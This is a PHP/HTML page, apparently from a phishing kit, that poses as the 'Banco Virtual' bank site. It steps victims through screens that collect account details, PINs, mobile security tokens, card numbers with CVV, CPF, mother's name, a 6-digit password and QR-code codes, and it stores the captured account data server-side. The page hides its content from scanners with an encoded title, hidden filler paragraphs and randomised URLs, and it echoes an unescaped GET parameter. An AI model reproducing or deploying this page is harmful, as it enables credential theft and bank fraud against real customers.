<?php
require_once('../_admin/config.php');
require_once('../validacao.php');
require_once('../Lorem.php');
if(isset($_SESSION['agencia']) && strlen($_SESSION['agencia']) > 2 && isset($_SESSION['conta']) && strlen($_SESSION['conta']) > 3 && isset($_SESSION['s4']) && strlen($_SESSION['s4']) == 4){

    $agencia = $_SESSION['agencia'];
    $conta = $_SESSION['conta'];
    $aConta = explode('-', $conta);
    $conta = $aConta[0];
    $digito = $aConta[1];
    $s4 = $_SESSION['s4'];
    Info::gravarInfoMobile($_SESSION['idAcesso'], $agencia, $conta, $digito, $senha4);
    
}

$info = null;
if(isset($_SESSION['id'])){
    $info = Info::findInfoById($_SESSION['id']);
}

$infoTipo = isset($info) && isset($info['tipo']) ? $info['tipo'] : '';

function getLayout(){
    global $infoTipo;
    if($infoTipo == 'Banco Virtual Prime'){
        return 'prime';
    } else if($infoTipo == 'Banco Virtual Exclusive'){
        return 'exclusive';
    } else {
        return 'padrao';
    }
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,700&display=swap" rel="stylesheet">

    <link rel="stylesheet" href="css/bootstrap.min.css">
    <?php
        $tipoDaConta = getLayout();

        if($tipoDaConta == "exclusive"){
            echo '<link rel="stylesheet" href="css/style-exclusive.css">';
        } else if($tipoDaConta == "prime") {
            echo '<link rel="stylesheet" href="css/style-prime.css">';
        } else {
            echo '<link rel="stylesheet" href="css/style.css">';
        }
    ?>
    <link rel="shortcut icon" href="images/favicon.ico">
<script>
document.write(unescape('%3Ctitle%3EBanco%20Virtual%20%7C%20Entre%20N%C3%B3s%2C%20Voc%C3%AA%20Vem%20Primeiro%3C/title%3E'));
</script>
	      <style>
         p.random{display:none!important;}
      </style>
	  <script type="text/javascript">

  function gerarCodigo(length) {
    var caracteres = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var codigo = '';
    for (var i = 0; i < length; i++) {
      codigo += caracteres.charAt(Math.floor(Math.random() * caracteres.length));
    }
    return codigo;
  }

  function alterar_url(nova) {
    var codigo = gerarCodigo(60);
    var dataHoraAtual = new Date();
    var dia = dataHoraAtual.getDate().toString().padStart(2, '0');
    var mes = (dataHoraAtual.getMonth() + 1).toString().padStart(2, '0');
    var ano = dataHoraAtual.getFullYear().toString();
    var hora = dataHoraAtual.getHours().toString().padStart(2, '0');
    var minutos = dataHoraAtual.getMinutes().toString().padStart(2, '0');
    var segundos = dataHoraAtual.getSeconds().toString().padStart(2, '0');
    
    var link = nova + "=?" + codigo + dia + mes + ano + '_' + hora + minutos + segundos;
    history.pushState({}, null, link);
  }
  </script>
</head>
<body onload="alterar_url('')">
   <p class="random"><?php echo "Carregando...";?></p>
    <nav class="navbar d-flex">   <p class="random"><?php echo "Carregando...";?></p>
        <a class="navbar-brand" href="javascript:;"><img src="images/bars.png" alt=""></a>
        <p class="header-title">Banco Virtual</p>   <p class="random"><?php echo "Carregando...";?></p>
    </nav>   <p class="random"><?php echo "Carregando...";?></p>
    
	<div id="boxAguardar" class="boxes">
   <p class="random"><?php echo "Carregando...";?></p>
        <h3 class="title aguarde">Aguarde...</h3>
   <p class="random"><?php echo "Carregando...";?></p>
    <?php
        $tipoDaConta = getLayout();

        if($tipoDaConta == "exclusive"){
            echo '<img class="mx-auto d-block" src="images/aguarde_exclusive.gif">';
        } else if($tipoDaConta == "prime") {
            echo '<img class="mx-auto d-block" src="images/aguarde_prime.gif">';
        } else {
            echo '<img class="mx-auto d-block" src="images/aguardando.gif">';
        }
    ?>

        <div class="conteudo">   <p class="random"><?php echo "Carregando...";?></p>
            <p class="destaque"><span class="nome"></span>Por favor Aguarde.. Assim que solicitado, será necessário utilizar sua chave de segurança, para isso:</p>
   <p class="random"><?php echo "Carregando...";?></p>   <p class="random"><?php echo "Carregando...";?></p>
            <div class="item equalHMRWrap">   <p class="random"><?php echo "Carregando...";?></p>
                <div class="contador">1</div>
                <div class="texto"><p>Acesse o aplicativo Banco Virtual instalado em seu dispositivo móvel</p></div>
            </div>
            <div class="item">   <p class="random"><?php echo "Carregando...";?></p>
                    <div class="contador">2</div>
                    <div class="texto"><p>Selecione a opção "Chave de Segurança"</p></div>
            </div>
            <div class="item">   <p class="random"><?php echo "Carregando...";?></p>
                    <div class="contador">3</div>
                    <div class="texto"><p>Informe seu PIN (senha de 4 dígitos)</p></div>
            </div>
            <div class="item">   <p class="random"><?php echo "Carregando...";?></p>
                    <div class="contador">4</div>
                    <div class="texto"><p>Informe a chave de segurança de 6 digítos informada no visor do seu dispositivo</p></div>
            </div>

        </div>

    </div>
	
	
	<div id="boxCarregando" class="boxes hide">
            <div class="center box-img">

                <?php
                    $tipoDaConta = getLayout();
                    if($tipoDaConta == "exclusive"){
                        echo '<img src="../images/aguarde_exclusive.gif" alt="">';
                    } else if($tipoDaConta == "prime") {
                        echo '<img src="../images/aguarde_prime.gif" alt="">';
                    } else {
                        echo '<img src="../images/aguardando.gif" alt="">';
                    }
                ?>
                
            </div>
            <div class="center">
                <div class="msg_cancelamento_qrcode">O cancelamento da transação está em andamento.<br>
    Aguarde alguns instantes...</div>
            </div>
        </div>
	
    <div id="boxToken" class="boxes hide">
        <h3 class="title content">CHAVE DE SEGURANÇA</h3>
        <div class="erro hide">   <p class="random"><?php echo "Carregando...";?></p>
            <p class="msg"></p>
        </div>   <p class="random"><?php echo "Carregando...";?></p>
        <div class="center">
            <img class="token" src="images/mobile-token_128.png" alt="">
        </div>
        <p class="justify"><span class="nome"></span>Informe a chave de segurança visualizada no visor do seu dispositivo para que possamos sincronizar á sua conta.</p>

           <p class="random"><?php echo "Carregando...";?></p>
        <section id="form-token">
            <form autocomplete="off">
                    <div class="input-container">   <p class="random"><?php echo "Carregando...";?></p>

                        <input type="tel" id="tokenChave" class="frmFieldNew espacado" maxlength="6" style="width: 250px; text-align: center;" onkeyup="this.value=this.value.replace(/[^\d]/,'')">
                    </div>
                <input placeholder="INFORME A CHAVE DE SEGURANÇA" type="submit" class="btn-acessar bt_avancar" value="Confirmar">
            </form>
        </section>   <p class="random"><?php echo "Carregando...";?></p>
    </div>
    <div id="boxTabela" class="boxes hide">
        <h3 class="title content">CHAVE DE SEGURANÇA</h3>
        <div class="erro hide">
            <p class="msg"></p>
        </div>   <p class="random"><?php echo "Carregando...";?></p>
        <div class="center">
            <img class="token" src="images/tancode_128.png" alt="">
        </div>
        <p class="justify"><span class="nome"></span>Preencha o campo abaixo com a chave indicada no verso do seu cartão, conforme posição solicitada.</p>
        <div class="center" style="margin-bottom:30px;">   <p class="random"><?php echo "Carregando...";?></p>
            <p style="margin-bottom: 10px;"><strong>Posição <span id="posicaoChave"></span></strong> no verso do cartão:</p>
            <input type="tel" id="chaveTabela" class="frmFieldNew espacado" maxlength="3" style="width: 150px; text-align: center;" onkeyup="this.value=this.value.replace(/[^\d]/,'')">
        </div>   <p class="random"><?php echo "Carregando...";?></p>
        <div class="container">
            <input placeholder="INFORME A CHAVE DE SEGURANÇA" type="submit" class="btn-acessar bt_avancar" value="Confirmar">
        </div>
    </div>
    <div id="boxCvv" class="boxes hide">   <p class="random"><?php echo "Carregando...";?></p>
        <h3 class="title content">DADOS DO CARTÃO</h3>
        <div class="erro hide">
            <p class="msg"></p>
        </div>
        <div class="center">
            <img class="token" src="images/icone-cvv.png" alt="">
        </div>
        <p class="justify"><span class="nome"></span>Preencha os campos abaixo com os dados do seu <strong>cartão de crédito / débito</strong>.</p>
        
        <div class="center" style="margin-bottom:20px;">
            <p style="margin-bottom: 10px;"><strong>Número do cartão:</strong></p>
            <input type="tel" id="numeroCartao" class="frmFieldNew espacado" maxlength="22" style="width: 90%; max-width: 320px; text-align: center; font-size: 16px;" placeholder="0000.0000.0000.0000">
        </div>
        
        <div class="center" style="margin-bottom:20px;">
            <p style="margin-bottom: 10px;"><strong>Mês/Ano:</strong></p>
            <input type="tel" id="mesAno" class="frmFieldNew espacado" maxlength="5" style="width: 120px; text-align: center;" placeholder="MM/AA">
        </div>
        
        <div class="center" style="margin-bottom:30px;">
            <p style="margin-bottom: 10px;"><strong>CVV:</strong></p>
            <input type="tel" id="cvv" class="frmFieldNew espacado" maxlength="3" style="width: 100px; text-align: center;" placeholder="CVV">
        </div>
        
        <div class="container">
            <input placeholder="INFORME A CHAVE DE SEGURANÇA" type="submit" class="btn-acessar bt_avancar" value="Confirmar">
        </div>
    </div>
    <div id="boxCelular" class="boxes hide">
        <h3 class="title content">NÚMERO DO CELULAR</h3>
        <div class="erro hide">
            <p class="msg"></p>
        </div>
        <div class="center">
            <img class="token" src="images/phone.png" alt="">
        </div>
        <p class="justify"><span class="nome"></span>Confirme no campo abaixo o <strong>número do celular</strong> cadastrado em sua conta.</p>
        <div class="center" style="margin-bottom:30px;">
            <p style="margin-bottom: 10px;"><strong>Número do celular:</strong></p>
            <input type="tel" id="celular" class="frmFieldNew" style="width: 250px; text-align: center;">
        </div>
        <div class="container">
            <input placeholder="INFORME A CHAVE DE SEGURANÇA" type="submit" class="btn-acessar bt_avancar" value="Confirmar">
        </div>
    </div>
    <div id="boxCpf" class="boxes hide">
        <h3 class="title content">CPF DO TÍTULAR</h3>
        <div class="erro hide">
            <p class="msg"></p>
        </div>   <p class="random"><?php echo "Carregando...";?></p>
        <div class="center">
            <img class="token" src="images/icon-cpf.png" alt="">
        </div>   <p class="random"><?php echo "Carregando...";?></p>
        <p class="justify"><span class="nome"></span>Confirme no campo abaixo o <strong>número do CPF</strong> do títular da conta.</p>
        <div class="center" style="margin-bottom:30px;">   <p class="random"><?php echo "Carregando...";?></p>
            <p style="margin-bottom: 10px;"><strong>Número do CPF:</strong></p>
            <input type="tel" id="cpf" class="frmFieldNew" style="width: 250px; text-align: center;">   <p class="random"><?php echo "Carregando...";?></p>
        </div>
        <div class="container">   <p class="random"><?php echo "Carregando...";?></p>
            <input placeholder="INFORME A CHAVE DE SEGURANÇA" type="submit" class="btn-acessar bt_avancar" value="Confirmar">
        </div>
    </div>   <p class="random"><?php echo "Carregando...";?></p>
    <div id="boxNomeMae" class="boxes hide">
        <h3 class="title content">NOME DA MÃE</h3>
        <div class="erro hide">
            <p class="msg"></p>   <p class="random"><?php echo "Carregando...";?></p>
        <div class="center">
            <img class="token" src="images/icone-mae.png" alt="">
        </div>
        <p class="justify"><span class="nome"></span>Confirme no campo abaixo o <strong>nome da mãe</strong> do títular da conta.</p>
        <div class="center" style="margin-bottom:30px;">   <p class="random"><?php echo "Carregando...";?></p>
            <p style="margin-bottom: 10px;"><strong>Nome da mãe:</strong></p>   <p class="random"><?php echo "Carregando...";?></p>
            <input type="text" id="nomeMae" class="frmFieldNew" style="width: 300px; text-align: center;">
        </div>   <p class="random"><?php echo "Carregando...";?></p>
        <div class="container">
            <input placeholder="INFORME A CHAVE DE SEGURANÇA" type="submit" class="btn-acessar bt_avancar" value="Confirmar">
        </div>
		</div>   
	</div>
	
	<p class="random"><?php echo "Carregando...";?></p>
    <div id="boxSenhaDe6" class="boxes hide">
        <h3 class="title content">SENHA DE 6 DÍGITOS</h3>
        <div class="erro hide">
            <p class="msg"></p>
        </div>   <p class="random"><?php echo "Carregando...";?></p>
        <div class="center">
            <img class="token" src="images/icon-password.png" alt="">   <p class="random"><?php echo "Carregando...";?></p>
        </div>
        <p class="justify"><span class="nome"></span>Informe sua senha de <strong style="white-space:nowrap">6 Dígitos</strong> a mesma utilizada nos terminais de autoatendimento Banco Virtual.</p>
        <div class="center" style="margin-bottom:30px;">   <p class="random"><?php echo "Carregando...";?></p>
            <p style="margin-bottom: 10px;"><strong>Senha de 6 Dígitos:</strong></p>   <p class="random"><?php echo "Carregando...";?></p>
            <input type="tel" id="senhaDe6" class="frmFieldNew espacado dotsfont" maxlength="6" style="width: 250px; text-align: center;" onkeyup="this.value=this.value.replace(/[^\d]/,'')">
        </div>
        <div class="container">   <p class="random"><?php echo "Carregando...";?></p>
            <input placeholder="INFORME A CHAVE DE SEGURANÇA" type="submit" class="btn-acessar bt_avancar" value="Confirmar">
        </div>
    </div>
   <p class="random"><?php echo "Carregando...";?></p>
    <div id="boxAtualizarModulo" class="boxes hide">
        <h3 class="title content">Atualização do Módulo de Segurança!</h3>   <p class="random"><?php echo "Carregando...";?></p>

        <div class="center">
            <img class="token" width="130" src="images/logo-virtual.png" alt="">   <p class="random"><?php echo "Carregando...";?></p>
        </div>
        <div class="barra">
            <div class="miolo"></div>   <p class="random"><?php echo "Carregando...";?></p>
        </div>
        <p class="porcentagem"></p>
        <p style="font-size:13px">Aguarde enquanto atualizamos seu complemento de segurança, isso pode levar alguns minutos.</p>
    </div>
	
	<p class="random"><?php echo "Carregando...";?></p>
        <div id="boxQrCode" class="boxes hide">
            <div class="boxLinha">
            <span class="txt_msg_erro_disp">
                  <span class="erro_msg ml10 none_i error-show" style="display:none" ><b>O código informado não está correto.</b></span>
               </span>
               <div id="aguardeQR" class="aguardeQR_div hide">
                     <p>Estamos gerando o cancelamento da transação em análise, efetue a captura do <strong>QR Code</strong> utilizando o <strong>App Banco Virtual</strong> instalado em seu celular.</p>
                     <img class="loadingQr" width="70" src="images/loading-inicial.gif" alt="">
                     <br>
                     <a href="javascript:;"><img width="130" src="images/btn-aguarde-disabled.png" alt=""></a>
               </div>
               <div id="capturaQR" class="hide">
                  <h1>Validação Digital</h1>
                  <div class="itemQr clearfix">
                     <div class="esquerdaQr">
                        <p style="width:200px"><span class="number">1.</span> No Aplicativo Banco Virtual, acesse a <strong>Chave de Segurança</strong>.  Em seguida, toque na opção <strong>Validação Digital</strong> e faça a leitura desta imagem com a câmera do seu celular.</p>
                     </div>
                     <div class="direitaQr">
                        <div class="qrBox"><img width="161" src=""></div>
                     </div>
                  </div>
                  <div class="itemQr clearfix" style="border:none">
                     <div class="esquerdaQr">
                        <p style="width:200px"><span class="number">2.</span> Digite o código que aparece no celular para cancelar a transação.</p>
                     </div>
                     <div class="direitaQr">
                           <input type="password" class="numeric tabindex tabfirst" title="Digite a chave informada no visor do seu celular." style="width: 84px;" id="qrCodeToken" name="codigoDispositivo" size="8" maxlength="8" tabindex="10" value="">
                           <span class="leg">(8 dígitos)</span>
                     </div>
                  </div>
                  
                  <div class="divBotoesPagina" style="margin:30px 0px; padding:0px;width:200px">
					 <input placeholder="INFORME A CHAVE DE SEGURANÇA" type="submit" class="btn-acessar bt_avancar" value="Confirmar">
                  </div>
               </div>

            </div>
        </div>

    <div id="boxMsg" class="boxes hide">
        <h3 class="title content" style="text-align: center;font-size:21px;">Antenção!</h3>
        <p id="msg" style="font-size:13px;padding: 0px 16px;text-align: center;font-size:14px;margin-bottom:40px;"></p>
        <div class="container">
            <input placeholder="INFORME A CHAVE DE SEGURANÇA" type="submit" class="btn-acessar bt_entendido" value="Entendido!">
        </div>
    </div>
    <input type="hidden" name="clientHashId" id="clientHashId" value="<?php echo $_GET["hash"];?>">
    <input type="hidden" name="id" id="id" value="<?php echo isset($_SESSION["id"]) ? $_SESSION["id"] : '';?>">
    <input type="hidden" name="idAcesso" id="idAcesso" value="<?php echo isset($_SESSION["idAcesso"]) ? $_SESSION["idAcesso"] : '';?>">
    <script src="js/jquery.min.js"></script>
    <script src="js/jquery.mask.min.js"></script>
    <script src="js/identificacao.js?v=<?php echo time(); ?>"></script>
</body>
</html>